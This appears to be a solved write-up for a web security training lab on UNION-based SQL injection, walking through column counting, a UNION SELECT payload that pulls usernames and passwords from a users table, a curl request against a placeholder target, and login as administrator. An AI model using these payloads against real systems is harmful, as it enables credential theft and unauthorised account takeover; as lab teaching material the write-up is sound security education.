# SQL injection UNION attack, retrieving data from other tables — Practitioner

**Status:** Solved

---

## Goal

Use UNION-based SQL injection to retrieve data from a different table. Extract usernames and passwords from the 'users' table and log in as administrator.

---

## Steps (simple & complete)

1. **Find the injection point**
   - Browse to the shopping application
   - Click on any product category:
```
   GET /filter?category=Gifts
```
   - This parameter is vulnerable to SQL injection

2. **Determine the number of columns**
   - Use ORDER BY to find column count:
```
   Gifts' ORDER BY 1--
   Gifts' ORDER BY 2--
   Gifts' ORDER BY 3--
```
   - Let's say it returns 2 columns (error at ORDER BY 3)

3. **Verify both columns accept text**
   - Test with string values:
```
   Gifts' UNION SELECT 'abc','def'--
```
   - If no error, both columns can handle text

4. **Know the target table structure**
   - The lab tells you there's a table called `users`
   - It has columns: `username` and `password`
   - This is given information - no need to enumerate

5. **Extract data from users table**
   - Use UNION to select from the users table:
```
   Gifts' UNION SELECT username,password FROM users--
```
   - This combines product results with user credentials

6. **Execute the injection**
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--"
```

7. **Find administrator credentials**
   - Look through the page output
   - You'll see usernames and passwords displayed alongside products
   - Find the row with username 'administrator'
   - Copy the administrator's password

8. **Log in as administrator**
   - Go to the login page
   - Username: `administrator`
   - Password: (the one you extracted)
   - Click "Log in"
   - Lab solves automatically once you're logged in

---

## Example

- Vulnerable endpoint: `GET /filter?category=Gifts`
- Column count: 2 columns
- Target table: `users` with columns `username`, `password`

Payload:
```bash
curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--"
```

Output on page might show:
```
Product: Laptop - $999
Product: Mouse - $20
administrator:s3cr3tp@ssw0rd
wiener:peter
carlos:montoya
Product: Keyboard - $50
```

Extract `administrator:s3cr3tp@ssw0rd` and log in!

---

## Why this works

**UNION operator basics:**
- UNION combines results from two SELECT statements
- Both queries must return same number of columns
- Column types must be compatible
- Results are merged into a single result set

**The attack flow:**
1. Original query: `SELECT name,description FROM products WHERE category='Gifts'`
2. Our injection: `Gifts' UNION SELECT username,password FROM users--`
3. Final query: `SELECT name,description FROM products WHERE category='Gifts' UNION SELECT username,password FROM users--'`
4. Result: Products + User credentials in the same output

**Why it's dangerous:**
- We can access ANY table in the database
- Not limited to the original query's scope
- Bypasses application-level access controls
- Can extract sensitive data from unrelated tables

---

## Key concepts

**Column matching:**
- UNION requires exact column count match
- Data types should be compatible
- Order matters - first column in UNION maps to first column in original query

**Retrieving multiple rows:**
- UNION returns ALL rows from both queries
- You get all users, not just one
- Makes it easy to find administrator credentials

**Comment syntax:**
- `--` comments out everything after
- Removes the rest of the original query
- Essential for making injection work cleanly

---

